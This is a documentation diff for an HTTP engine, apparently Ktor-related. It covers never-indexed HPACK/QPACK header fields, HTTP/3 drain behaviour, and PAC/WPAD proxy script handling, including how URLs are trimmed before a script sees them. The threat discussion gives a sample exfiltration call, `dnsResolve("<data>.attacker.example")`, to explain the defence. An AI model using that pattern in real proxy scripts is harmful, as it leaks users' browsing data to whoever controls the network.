@@ -352,6 +352,14 @@ response's `Content-Length` is never sent as a complete response (the stream is 
 out as a 500. A call that ends without a response resets its stream; one stream's failure (a client's reset, a handler's
 exception) never affects the others on the connection.
 
+Never-indexed fields (RFC 7541 sections 6.2.3 and 7.1.3, experimental): `call.request.neverIndexedHeaders` lists the
+request fields the client sent as literals never indexed, and `call.response.neverIndex("x-api-key")` sends the named
+response fields so (neither into the HPACK table nor from it). An application that forwards a field it received never
+indexed must keep that representation: pass its name to `neverIndex` on the message it sends on, as the client's
+`neverIndex` and `neverIndexedHeaders` allow the other way. The engine sends `set-cookie` never indexed on its own.
+Over HTTP/3 the same API carries QPACK's 'N' bit (RFC 9204 section 4.5.4); over HTTP/1.1 the list is empty and
+`neverIndex` changes nothing.
+
 `http2Settings` (`Http2Settings`) holds the windows, SETTINGS_MAX_CONCURRENT_STREAMS (100) and the field-section and
 flood limits of the core ([configuration reference](configuration.md#ktor-server-engine)). The engine's deadlines apply:
 the client's connection preface must arrive within `requestHeaderTimeoutSeconds` of the accepted connection (TLS
@@ -424,8 +432,8 @@ cached alternative service entries".
 - `Drain` sends GOAWAY to every live HTTP/3 connection at once, as a [graceful stop](#graceful-stop) does, and to every
   connection whose handshake completes while it is set. The requests in flight complete; once the last response is
   acknowledged the client closes the connection (a Kuicksilver client does), or the server three seconds later.
-  **Not bounded in 0.3.0:** `Drain` has no grace deadline, so a long-lived stream (a WebSocket or WebTransport session
-  over HTTP/3) keeps its connection until the application or the client ends it; a drain deadline is planned for 0.3.x.
+  **Not bounded:** `Drain` has no grace deadline (RFC 9114 section 5.2 sets none), so a long-lived stream (a WebSocket
+  or WebTransport session over HTTP/3) keeps its connection until the application or the client ends it.
   To cut such sessions, stop the server (its grace period applies) or end them in the application.
 - A new client is refused with a stateless Initial CONNECTION_CLOSE carrying CONNECTION_REFUSED, as RFC 9000 section
   5.2.2 asks: "If a server refuses to accept a new connection, it SHOULD send an Initial packet containing a
@@ -868,6 +876,12 @@ switch does not turn HTTP/2 off. `http2 { enabled = false }` offers only `http/1
   which then goes over HTTP/1.1. Any other HTTP/2 failure fails
   the call with `Http2Exception` (`StreamReset`, `ConnectionClosed`, `MalformedMessage`, `FieldSectionTooLarge`); there
   is no silent repeat over HTTP/1.1.
+- **Never-indexed fields** (RFC 7541 sections 6.2.3 and 7.1.3, experimental): `neverIndex("x-api-key")` in the request
+  builder sends the named fields as literals never indexed (the engine does so on its own for every `authorization`
+  and `proxy-authorization` value, and for `cookie` values under 20 bytes), and `response.neverIndexedHeaders` lists the response fields
+  the server sent so. A proxy built on both engines keeps the representation by passing those names to `neverIndex` on
+  the message it forwards. Over HTTP/3 the same API carries QPACK's 'N' bit (RFC 9204 section 4.5.4); over HTTP/1.1 the
+  list is empty and `neverIndex` changes nothing.
 - **Responses** are checked against RFC 9113 section 8: a malformed one (an invalid field, a content-length that does
   not match the content) fails with `Http2Exception.MalformedMessage`. A response field section above
   `settings.maxHeaderListSize` (64 KiB) fails its call, not the connection.
@@ -1355,9 +1369,39 @@ Where a request's proxy comes from:
 |---|---|---|
 | JVM | `java.net.ProxySelector.getDefault()`: `https.proxyHost`/`http.proxyHost`, `socksProxyHost`, `http.nonProxyHosts`, and with `-Djava.net.useSystemProxies=true` the OS settings | as the JDK does |
 | Android | the same: the active network's proxy, PAC through the system | yes (by the system) |
-| macOS, iOS | the system proxy settings via `CFNetworkCopyProxiesForURL` (HTTP, HTTPS, SOCKS; the exceptions list) | not run: direct and one warning |
-| Windows | the user's Internet settings via `WinHttpGetIEProxyConfigForCurrentUser` (`host:port` or `http=…;https=…;socks=…`, the bypass list with `<local>`) | not run: a fixed proxy next to it is used, else direct; one warning |
+| macOS, iOS | the system proxy settings via `CFNetworkCopyProxiesForURL` (HTTP, HTTPS, SOCKS; the exceptions list) | run by the engine on JavaScriptCore: the PAC URL or script of the settings, or WPAD when they say "auto discover" (DHCP option 252 on macOS, `http`/`https` only; `wpad.<domain>` for each DNS search domain exactly, never a parent domain, though a search domain is used as given; then `http://wpad/wpad.dat` for the resolver to complete, the only candidate on iOS); scripts fetched directly (`http`, `https`, `file`, at most 1 MiB read, kept 30 min), each run limited to 2 s; a script that fails within 5 s: the next setting, else direct, and one warning; an answer with only proxies the engine cannot use (`HTTPS`, `SOCKS4`): the next setting, else the request fails; no WPAD script found: logged once at Info |
+| Windows | the user's Internet settings via `WinHttpGetIEProxyConfigForCurrentUser` (`host:port` or `http=…;https=…;socks=…`, the bypass list with `<local>`) | run by WinHTTP (`WinHttpGetProxyForUrl`, WPAD by DHCP and DNS, then the PAC URL), waited for at most 5 s; a script that fails or takes longer: the fixed proxy next to it, else direct, and one warning; no WPAD script found: the same, logged once at Info, and detection again after 5 minutes |
 | Linux | `ProxyResolvers.Environment` (there is no system API; desktop settings are not read) | — |
+
+What a PAC script sees. A PAC script is code from the network: whoever answers WPAD on the local network, or serves a
+plain-`http` PAC URL, writes it, and it can send any string it is given out through
+`dnsResolve("<data>.attacker.example")`. So the URL the engine passes `FindProxyForURL` is built as Chrome builds it (no
+user info or fragment, the host in lower case, the default port left out; the `host` argument in lower case too), and
+for secure URLs it is the origin only, as in Chrome (since 52, CVE-2016-5134), Android (CVE-2016-3763) and Firefox
+(which strips the path of every URL by default). A plain `http` URL also gives its origin only, but for another reason:
+the engine keeps answers per scheme, host and port, so a path could not change them (Chrome and Android pass an `http`
+URL's path; Firefox strips it):
+
+| Request | On Apple platforms and Windows the script gets | On the JVM and Android `ProxySelector.select` gets |
+|---|---|---|
+| `https://h/p?q` | `https://h/` | `https://h:443/` |
+| `wss://h:8443/p?q` | `wss://h:8443/` (with `pacFullWebSocketUrl` and the settings' own script, inline or from an `https`/local `file` URL: `wss://h:8443/p?q`; WinHTTP: as `https://` when it refuses `wss`) | `https://h:8443/p?q` (Android's selector cuts it to `https://h:8443/` before its PAC runs; the JDK's passes the OS only scheme and host) |
+| `ws://h/p?q` | `ws://h/p?q` (WinHTTP: as `http://` when it refuses `ws`) | `http://h:80/p?q` |
+| `http://h/p?q` | `http://h/` | `http://h:80/` |
+
+RFC 6455 section 4.1 asks for a WebSocket's whole URI, resource name included; for `wss` the engine departs from that
+by default for this reason. `engine { pacFullWebSocketUrl = true }` (*experimental*) gives the whole `wss` URI to the
+script the system settings name, given inline (Apple) or by an `https://` or local `file:///` URL (Windows: the "Use setup
+script" address; Apple: the PAC URL), and never to one WPAD found or one fetched over plain `http://`: whoever answers
+on the local network writes those. On Apple platforms the PAC URL CFNetwork reports must equal the settings' string
+exactly; a URL written differently (case, a trailing slash) gets the origin only. A `file:` URL with a host
+(`file://srv/share/p.pac`, `file:////srv/share/p.pac`) is fetched over SMB from that host and counts as remote: origin
+only. Turn it on only when that script is
+yours.
+On Apple platforms the engine's own runner also bounds the script: 2 s per run, 20 distinct lookups per run in total (as
+Chrome; a name looked up by both `dnsResolve` and `dnsResolveEx` counts twice), an answer of at most 64 KiB of ASCII, a script of at most 1 MiB; an answer entry it cannot read is skipped,
+and an answer with none left counts as a failed script. JavaScriptCore's public API has no memory limit: a script that
+allocates without end is stopped only by the time limit (its thread is given up, threat model 3.20.3).
 
 `ProxyResolvers.Environment` reads the variables as curl does: `https_proxy`/`HTTPS_PROXY` for `https` and `wss`,
 `http_proxy` (lower case only) for `http` and `ws`, then `all_proxy`/`ALL_PROXY`; `no_proxy`/`NO_PROXY` exempts `*`,
